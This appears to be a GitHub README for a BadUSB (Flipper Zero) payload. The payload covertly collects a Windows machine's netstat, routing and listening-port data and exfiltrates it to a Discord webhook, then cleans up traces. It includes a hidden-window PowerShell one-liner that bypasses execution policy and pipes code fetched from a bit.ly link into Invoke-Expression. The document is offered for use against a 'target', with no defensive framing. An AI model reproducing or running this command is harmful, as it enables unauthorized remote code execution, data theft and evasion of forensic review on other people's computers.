# Windows netstat - BADUSB ✅

A script used to stole target netstat status.


**Category**: Net, Exfiltration

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Faleff-github%2Fmy-flipper-shits&count_bg=%233C3C3C&title_bg=%233C3C3C&icon=linux.svg&icon_color=%23FFFFFF&title=views&edge_flat=false)](https://hits.seeyoufarm.com)

## Description

This script will stole target netstat status.

Opens PowerShell hidden, grabs netstat status, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.

Then it cleans up traces of what you have done after.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke the indicated commands 
* Invoke-WebRequest will be entered in the Run Box to send the content

### Settings
Put 1 on the function that you want to active, else 0.
Functions available:
- default (*or simple 'netstat' command*)
- routing_table **$r**
- listening_canonical **$lc**
- listening_numerical **$ln**
- all_canonical **$ac**
- all_numerical **$an**
- offload **ot**
- proto **$p "\<protocol>"**
    - *In this option you must put the protocol that you want to monitor, for example $proto="TCP" if you want to monitor TCP, else leave blank, so $proto="".*

```powershell
powershell -w h -ep bypass $discord='';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/Windows-netstat | iex
```

You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
